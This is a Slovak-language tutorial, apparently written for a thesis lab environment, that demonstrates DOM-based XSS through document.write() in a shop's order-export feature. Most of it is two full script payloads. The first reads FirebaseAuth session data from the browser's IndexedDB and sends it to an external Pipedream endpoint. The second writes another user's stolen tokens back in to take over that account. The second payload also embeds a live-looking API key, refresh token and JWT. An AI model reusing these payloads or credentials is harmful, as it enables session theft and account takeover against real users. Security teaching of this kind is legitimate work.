# Document objcet model cross site scripting (DOM XSS)

### Prostredie: Dp-Test-Enviroment - https://github.com/MatusVetrik/dp-test-enviroment

- Teraz si predstavíme DOM XSS na príklade vygenerovania exportu objednávky do novéhe tabu prehliadača pomocou metódy document.write().
- Metóda document.write() prepisuje celú kostru stránky a generuje novú pomocou argumentu vloženého do metódy. Týmto spôsobom sa dajú jednoducho a automatizovane generovať nové stránky alebo upravovať už existujúce.
- Problém nastáva, keď sa do argumentu vloží vrátane rôznych tagov aj škodlivý kód. Škodlivý kód je priamo vložený do tela stránky.
- Ako môžeme vidieť v testovacom prostredí, tak obrayovka obsahuje input kam zapisujeme názov exportu našej objednávky a tlačidlo na vygenerovanie exportu.
- Ako prvé sa presunieme na podstránku produktov a vložíme ľubovoľné produkty do košíka.
- Keď máme košík naplnený produktami môžeme zmeniť alebo ponechať názov exportu a kliknúť na tlačidlo “Export”.
- Vygeneroval sa nám jednoduchý export objednávky na novom tabe. Ako môžeme vidieť názov exportu je vpísaný ako nadpis nad jednotlivými položkami košíka. Hodnota z inputu je priamo vložené do 
  tela novej stránky čím vzniká zraniteľnosť a priestor na vloženie škodlivého kódu.
- Zopakujme si proces generovania exportu ale teraz vložíme škodlivý kód do inputu pre názov exportu.
- Vložme nasledovný úryvok kódu do inputu:
- ```
      <script>
      const request = window.indexedDB.open("firebaseLocalStorageDb");
      request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const getDataRequest = objectStore.getAll();

        getDataRequest.onsuccess = (event) => {

        const headers = new Headers();
        headers.append("Content-Type", "text/plain");

        const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: JSON.stringify(event.target.result),
        };

        fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);
        }
      };
      </script>
- Ukážkový kód sprístupní lokálnu databázu prehliadača (indexDB), ktorú autentifikačný servis FirebaseAuth využíva na uchovávanie dát o prihlásenom používateľovi. 
  Vytiahneme dáta z databázy a celý objekt si odošleme na náš vygenerovaný endpoint v službe Pipedream (https://pipedream.com/).
- Po vygenerovaní exportu môžeme vidieť, že názov exportu je prázdny a spustil sa náš škodlivý kód. Na endpoint by nám mal prísť celý objekt s dátami.
- Odhlásime sa z aplikácie a opätovne sa prihlásisme pod iným účtom, buď existujúcim alebo si vytvoríme nový.
- Po prihlásení využijeme spomínanú zraniteľnosť znova a vložíme do lokálnej databázy dáta užívateľa, čím prelomíme autentifikáciu a prihlásime sa do iného účtu.
- Kód na vloženie používateľských dať vyzerá nasledovne:
     ```<script>
      const request = window.indexedDB.open("firebaseLocalStorageDb");
      request.onsuccess = (event) => {
        const db = event.target.result;

        const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
        const objectStore = transaction.objectStore("firebaseLocalStorage");

        const data = {
          fbase_key:
            "firebase:authUser:AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg:[DEFAULT]",
          value: {
            uid: "RTejhfCWw0OAlHcoAj41Fy93ZJJ3",
            email: "mate@gmail.com",
            emailVerified: false,
            isAnonymous: false,
            providerData: [
              {
                providerId: "password",
                uid: "mate@gmail.com",
                displayName: null,
                email: "mate@gmail.com",
                phoneNumber: null,
                photoURL: null,
              },
            ],
            stsTokenManager: {
              refreshToken:
                "AMf-vByIsfsiw-8vT6jzvFkIqMjZhSvTzJ16dCdww3w_Pk_9kwwfanAaW09W-DWc70KzKjxtp7Dq7aEPRImKkgLIHiCN4ROLsi5NBpvQrRSNGonNI-5wt_
                  9PHITM0bt5ZXSayEMzx7dRUHJdj8-lbwiflyUREJh3TUy-QLmoxyg3rY-G6B1Ff1OQPTv-VRFJGmp3GQ2dJ5Bl0hyBKiELNwcjKDTrVyRjPw",
              accessToken:
                "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhNjI1OTZmNTJmNTJlZDQ0MDQ5Mzk2YmU3ZGYzNGQyYzY0ZjQ1M2UiLCJ0eXAiOiJKV1QifQ
    .eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGlwbG9tb3ZrYS10ZXN0LWFwcCIsImF1ZCI6ImRpcGxvbW92a2EtdGVzdC1hcHA
    iLCJhdXRoX3RpbWUiOjE3MTE3OTA0OTYsInVzZXJfaWQiOiJSVGVqaGZDV3cwT0FsSGNvQWo0MUZ5OTNaSkozIiwic3ViIjoiUlRlamhmQ1d3ME9BbE
    hjb0FqNDFGeTkzWkpKMyIsImlhdCI6MTcxMTc5MDQ5NiwiZXhwIjoxNzExNzk0MDk2LCJlbWFpbCI6Im1hdGVAZ21haWwuY29tIiwiZW1haWxfdmVyaWZ
    pZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1hdGVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc
    3dvcmQifX0.0Mp-T84dmzTpiAdVyhl68WV2qDvTZ78IHGYca5YpBgBx4A_m_YXoJ-IYBaTl-Yp-fXYzuKN3Vff0iqkNA5nVtUcOFfG1X157DrkE80gxp6e
    7ELg2jn_N6mF1Xw-jTSaJoAAsG8f3e_wHp-cfVqWyBNrcUTABrP8Hy_bv-iyUII60PZtjiu_oo7ObVFhoPEim82rlPJDLiwpPMos7qGEBsvw4-fKQvLPkR
    wkGbCf8bKt6Pn_jThtR9JPuhU_G2SlgppA0PuuLSyO8KViFoH4XgFMi9kyX3YU8vmg7O5bDwCYemLLpvQt4KY900_qQgxS2GnX89h_V-hNu_bGqQpL9Zg",
              expirationTime: 1711794096425,
            },
            createdAt: "1711388904315",
            lastLoginAt: "1711790496471",
            apiKey: "AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg",
            appName: "[DEFAULT]",
          },
        };

        objectStore.clear();

        const addDataRequest = objectStore.add(data);

        addDataRequest.onsuccess = (event) => alert("Success!");
      };
    </script>

- Teraz môžeme refreshnut stránku a ako môžeme vidieť v hlavičke stránky alebo po kliku na profil, že sme prihlásený pod iným účtom.